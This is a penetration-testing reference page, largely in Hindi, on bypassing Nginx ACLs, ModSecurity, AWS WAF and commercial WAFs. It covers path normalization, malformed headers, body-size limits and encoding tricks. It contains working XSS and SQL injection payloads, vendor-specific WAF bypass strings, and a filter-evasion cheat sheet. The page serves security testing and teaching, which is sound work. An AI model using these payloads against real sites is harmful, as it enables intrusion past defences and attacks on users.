# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

तकनीकें [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx नियम का उदाहरण:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
बायपास रोकने के लिए Nginx उसे चेक करने से पहले path का normalization करता है। हालाँकि, यदि बैकएंड सर्वर अलग normalization करता है (ऐसे characters हटाकर जिन्हें nginx नहीं हटाता), तो इस रक्षा को बायपास करना संभव हो सकता है।

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM कॉन्फ़िगरेशन:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx को `/admin.php` तक पहुँच अवरुद्ध करने के लिए कॉन्फ़िगर किया गया है, लेकिन `/admin.php/index.php` तक पहुँच करके इसे बाईपास किया जा सकता है।

### इसे कैसे रोका जाए
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security नियम बायपास करें <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### पथ भ्रम

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) में बताया गया है कि ModSecurity v3 (3.0.12 तक) ने `REQUEST_FILENAME` वेरिएबल को **गलत तरीके से लागू** किया था, जो कि एक्सेस किए गए path को (parameters की शुरुआत तक) रखना चाहिए था। यह इसलिए हुआ क्योंकि इसने path प्राप्त करने के लिए URL decode किया।\
इसलिए, एक request जैसे `http://example.com/foo%3f';alert(1);foo=` mod security में मान लेगा कि path सिर्फ `/foo` है क्योंकि `%3f` `?` में बदल जाता है और URL path वहीं खत्म हो जाता है, पर वास्तव में सर्वर जो path प्राप्त करेगा वह `/foo%3f';alert(1);foo=` होगा।

`REQUEST_BASENAME` और `PATH_INFO` वेरिएबल भी इस बग से प्रभावित थे।

Mod Security के version 2 में कुछ समान हुआ था जिससे एक सुरक्षा बाइपास हो सकती थी जो उपयोगकर्ता को बैकअप फाइल से जुड़े विशिष्ट एक्सटेंशन (जैसे `.bak`) वाली फाइलों तक पहुँचने से रोकती थी — बस dot को URL encoded `%2e` भेजकर, उदाहरण: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### मैलफॉर्म्ड हेडर

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) में बताया गया है कि HTTP headers पर लागू AWS WAF नियमों को bypass करना संभव था एक "malformed" header भेजकर जो AWS द्वारा सही तरह से parsed नहीं किया जाता था पर backend server द्वारा किया जाता था।

उदाहरण के लिए, X-Query हेडर में SQL injection के साथ निम्नलिखित request भेजने पर:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).

## सामान्य WAF बायपास

### अनुरोध आकार सीमाएँ

आम तौर पर WAFs के पास जांच के लिए अनुरोधों की एक निश्चित लंबाई सीमा होती है और यदि कोई POST/PUT/PATCH अनुरोध उससे बड़ा होता है, तो WAF उस अनुरोध की जांच नहीं करेगा।

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Application Load Balancer और AWS AppSync protections के लिए निरीक्षण किए जा सकने वाले web request body का अधिकतम आकार</td><td>8 KB</td></tr><tr><td>CloudFront, API Gateway, Amazon Cognito, App Runner, और Verified Access protections के लिए निरीक्षण किए जा सकने वाले web request body का अधिकतम आकार**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

पुराने Web Application Firewalls जिनमें Core Rule Set 3.1 (या उससे कम) है, request body inspection को बंद कर के **128 KB** से बड़े संदेशों की अनुमति देते हैं, लेकिन इन संदेशों की vulnerabilities के लिए जांच नहीं की जाएगी। नए वर्ज़न्स (Core Rule Set 3.2 या नए) में, वही अधिकतम request body limit को अक्षम कर के किया जा सकता है। जब कोई अनुरोध आकार सीमा से अधिक हो जाता है:

If p**revention mode**: अनुरोध को लॉग और ब्लॉक करता है.\
If **detection mode**: सीमा तक निरीक्षण करता है, बाकी को अनदेखा करता है, और लॉग करता है यदि `Content-Length` सीमा से अधिक है.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

डिफ़ॉल्ट रूप से, WAF केवल अनुरोध के पहले 8KB की जांच करता है। यह Advanced Metadata जोड़कर सीमा को 128KB तक बढ़ा सकता है।

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

128KB तक।

### Static assets inspection gaps (.js GETs)

कुछ CDN/WAF स्टैक्स स्टैटिक एसेट्स के लिए GET अनुरोधों (उदा. paths जो `.js` पर समाप्त होते हैं) पर कमजोर या कोई content inspection लागू करते हैं, जबकि rate limiting और IP reputation जैसे global नियम लागू रहते हैं। स्टैटिक एक्सटेंशन्स के auto-caching के साथ मिलकर, इसे बाद के HTML responses को प्रभावित करने वाले malicious variants डिलिवर या सीड करने के लिए दुरुपयोग किया जा सकता है।

व्यावहारिक उपयोग के मामले:

- एक `.js` path पर GET कर के untrusted headers (जैसे `User-Agent`) में payload भेजें ताकि content inspection से बचा जा सके, फिर कैश्ड variant को प्रभावित करने के लिए तुरंत मुख्य HTML का अनुरोध करें।
- नया/साफ IP इस्तेमाल करें; एक बार IP फ्लैग हो जाने पर, routing बदलाव इस तकनीक को अविश्वसनीय बना सकते हैं।
- Burp Repeater में, "Send group in parallel" (single-packet style) का उपयोग करें ताकि दो अनुरोधों (`.js` फिर HTML) को एक ही front-end path से रेस किया जा सके।

यह header-reflection cache poisoning के साथ अच्छी तरह मेल खाता है। देखें:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuscation <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode संगतता <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode normalization के कार्यान्वयन पर निर्भर करते हुए (अधिक जानकारी [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), जिन अक्षरों की Unicode संगतता समान होती है वे WAF को बाइपास कर सकती हैं और इच्छित payload के रूप में execute हो सकती हैं। संगत अक्षर [here](https://www.compart.com/en/unicode) पर पाए जा सकते हैं।

#### उदाहरण <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Contextual WAFs को एनकोडिंग के साथ बायपास करें <a href="#ip-rotation" id="ip-rotation"></a>

जैसा कि [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) में बताया गया है, user input का context बनाए रखने में सक्षम WAFs को बायपास करने के लिए हम WAF तकनीकों का दुरुपयोग करके उपयोगकर्ता इनपुट को वास्तविक रूप में सामान्यीकृत (normalize) करवा सकते हैं।

उदाहरण के लिए, पोस्ट में बताया गया है कि **Akamai ने एक user input को 10 बार URL decoded किया**। इसलिए कुछ इस तरह `<input/%2525252525252525253e/onfocus` Akamai के लिए `<input/>/onfocus` के रूप में दिखाई देगा, जिससे यह **लग सकता है कि टैग बंद हो गया है**। हालांकि, जब तक application इनपुट को 10 बार URL decode नहीं करता, victim को कुछ ऐसा दिखाई देगा `<input/%25252525252525253e/onfocus` जो कि **अब भी XSS attack के लिए वैध है**।

इसलिए, यह WAF द्वारा decode और interpret किए जाने वाले encoded components में payloads को छिपाने की अनुमति देता है, जबकि victim उन्हें नहीं देखेगा।

इसके अलावा, यह केवल URL encoded payloads तक सीमित नहीं है बल्कि unicode, hex, octal जैसे अन्य encodings के साथ भी किया जा सकता है...

पोस्ट में निम्नलिखित अंतिम bypasses सुझाए गए हैं:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

यह भी बताया गया है कि यह निर्भर करता है कि कुछ WAFs उपयोगकर्ता इनपुट के संदर्भ को कैसे समझते हैं, और इसे दुरुपयोग करना संभव हो सकता है। ब्लॉग में प्रस्तावित उदाहरण यह है कि Akamai ने `/*` और `*/` के बीच कुछ भी रखने की अनुमति दी (संभवतः क्योंकि यह आमतौर पर comments के रूप में उपयोग होता है)। इसलिए, एक SQLinjection जैसे `/*'or sleep(5)-- -*/` को पकड़ा नहीं जाएगा और यह वैध रहेगा क्योंकि `/*` injection का starting string है और `*/` comment कर रहा है।

इस तरह की संदर्भ संबंधी समस्याओं का उपयोग WAF द्वारा अपेक्षित vulnerability के अलावा अन्य vulnerabilities को भी दुरुपयोग करने के लिए किया जा सकता है (उदा. इसे XSS exploit करने के लिए भी इस्तेमाल किया जा सकता है)।

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf के साथ उपयोग करने के लिए एक API gateway URL जनरेट करें
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox के समान
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin जो API gateway IPs का उपयोग करता है
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): इनपुट फ़ाइल के आकार और split factor के आधार पर containers की संख्या गतिशील रूप से निर्धारित की जाती है, और इनपुट को parallel execution के लिए chunks में विभाजित किया जाता है — उदाहरण के लिए 10,000-line इनपुट फ़ाइल और 100-line split factor के साथ 100 chunks को 100 instances द्वारा प्रोसेस करना।
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Regex filters को बायपास करने के लिए विभिन्न तकनीकों का उपयोग किया जा सकता है। उदाहरणों में alternating case, line breaks जोड़ना, और payloads को encode करना शामिल हैं। विभिन्न bypasses के संसाधन [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) और [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) पर मिलते हैं। नीचे दिए गए उदाहरण [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) से लिए गए हैं।
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## उपकरण

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp plugin जो requests में junk data जोड़कर length के आधार पर WAFs को bypass करने के लिए इस्तेमाल होता है

## संदर्भ

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
